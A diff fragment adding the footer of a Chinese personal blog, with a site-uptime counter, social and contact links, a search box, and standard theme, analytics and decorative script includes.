+                    var days = hours * 24;
+                    var years = days * 365;
+                    var today = new Date();
+                    var startYear = "2020";
+                    var startMonth = "3";
+                    var startDate = "1";
+                    var startHour = "0";
+                    var startMinute = "0";
+                    var startSecond = "0";
+                    var todayYear = today.getFullYear();
+                    var todayMonth = today.getMonth() + 1;
+                    var todayDate = today.getDate();
+                    var todayHour = today.getHours();
+                    var todayMinute = today.getMinutes();
+                    var todaySecond = today.getSeconds();
+                    var t1 = Date.UTC(startYear, startMonth, startDate, startHour, startMinute, startSecond);
+                    var t2 = Date.UTC(todayYear, todayMonth, todayDate, todayHour, todayMinute, todaySecond);
+                    var diff = t2 - t1;
+                    var diffYears = Math.floor(diff / years);
+                    var diffDays = Math.floor((diff / days) - diffYears * 365);
+                    var diffHours = Math.floor((diff - (diffYears * 365 + diffDays) * days) / hours);
+                    var diffMinutes = Math.floor((diff - (diffYears * 365 + diffDays) * days - diffHours * hours) /
+                        minutes);
+                    var diffSeconds = Math.floor((diff - (diffYears * 365 + diffDays) * days - diffHours * hours -
+                        diffMinutes * minutes) / seconds);
+                    if (startYear == todayYear) {
+                        document.getElementById("year").innerHTML = todayYear;
+                        document.getElementById("sitetime").innerHTML = "本站已安全运行 " + diffDays + " 天 " + diffHours +
+                            " 小时 " + diffMinutes + " 分钟 " + diffSeconds + " 秒";
+                    } else {
+                        document.getElementById("year").innerHTML = startYear + " - " + todayYear;
+                        document.getElementById("sitetime").innerHTML = "本站已安全运行 " + diffYears + " 年 " + diffDays +
+                            " 天 " + diffHours + " 小时 " + diffMinutes + " 分钟 " + diffSeconds + " 秒";
+                    }
+                }
+                setInterval(siteTime, 1000);
+            </script>
+            
+            <br>
+            
+        </div>
+        <div class="col s12 m4 l4 social-link social-statis">
+    <a href="https://github.com/youngboy-lab" class="tooltipped" target="_blank" data-tooltip="访问我的GitHub" data-position="top" data-delay="50">
+        <i class="fab fa-github"></i>
+    </a>
+
+
+
+    <a href="mailto:youngscript@qq.com" class="tooltipped" target="_blank" data-tooltip="邮件联系我" data-position="top" data-delay="50">
+        <i class="fas fa-envelope-open"></i>
+    </a>
+
+
+
+
+
+
+
+    <a href="tencent://AddContact/?fromId=50&fromSubId=1&subcmd=all&uin=3122863920" class="tooltipped" target="_blank" data-tooltip="QQ联系我: 3122863920" data-position="top" data-delay="50">
+        <i class="fab fa-qq"></i>
+    </a>
+
+
+
+
+
+
+
+    <a href="/atom.xml" class="tooltipped" target="_blank" data-tooltip="RSS 订阅" data-position="top" data-delay="50">
+        <i class="fas fa-rss"></i>
+    </a>
+
+</div>
+    </div>
+</footer>
+
+<div class="progress-bar"></div>
+
+
+    <!-- 搜索遮罩框 -->
+<div id="searchModal" class="modal">
+    <div class="modal-content">
+        <div class="search-header">
+            <span class="title"><i class="fas fa-search"></i>&nbsp;&nbsp;搜索</span>
+            <input type="search" id="searchInput" name="s" placeholder="请输入搜索的关键字"
+                   class="search-input">
+        </div>
+        <div id="searchResult"></div>
+    </div>
+</div>
+
+<script src="/js/search.js"></script>
+<script type="text/javascript">
+$(function () {
+    searchFunc("/" + "search.xml", 'searchInput', 'searchResult');
+});
+</script>
+    <!-- 回到顶部按钮 -->
+<div id="backTop" class="top-scroll">
+    <a class="btn-floating btn-large waves-effect waves-light" href="#!">
+        <i class="fas fa-arrow-up"></i>
+    </a>
+</div>
+
+
+    <script src="/libs/materialize/materialize.min.js"></script>
+    <script src="/libs/masonry/masonry.pkgd.min.js"></script>
+    <script src="/libs/aos/aos.js"></script>
+    <script src="/js/snow.js"></script>
+    <script src="/libs/scrollprogress/scrollProgress.min.js"></script>
+    <script src="/libs/lightGallery/js/lightgallery-all.min.js"></script>
+    <!--动态线条背景-->
+	<script type="text/javascript"
+	color="122 103 238" opacity='0.7' zIndex="-2" count="200" src="//cdn.bootcss.com/canvas-nest.js/1.0.0/canvas-nest.min.js">
+	</script>
+    <script src="/js/matery.js"></script>
+
+    <!-- Baidu Analytics -->
+
+    <!-- Baidu Push -->
+
+<script>
+    (function () {
+        var bp = document.createElement('script');
+        var curProtocol = window.location.protocol.split(':')[0];
+        if (curProtocol === 'https') {
+            bp.src = 'https://zz.bdstatic.com/linksubmit/push.js';
+        } else {
+            bp.src = 'http://push.zhanzhang.baidu.com/push.js';
+        }
+        var s = document.getElementsByTagName("script")[0];
+        s.parentNode.insertBefore(bp, s);
+    })();
+</script>
+
+    
+    <script src="/libs/others/clicklove.js" async="async"></script>
+    
+    
+    <script async src="/libs/others/busuanzi.pure.mini.js"></script>
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+    
+    
+    <script src="/libs/instantpage/instantpage.js" type="module"></script>
+    
+    
+
+<script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"log":false,"pluginJsPath":"lib/","pluginModelPath":"assets/","pluginRootPath":"live2dw/","tagMode":false});</script></body>
+
+</html>
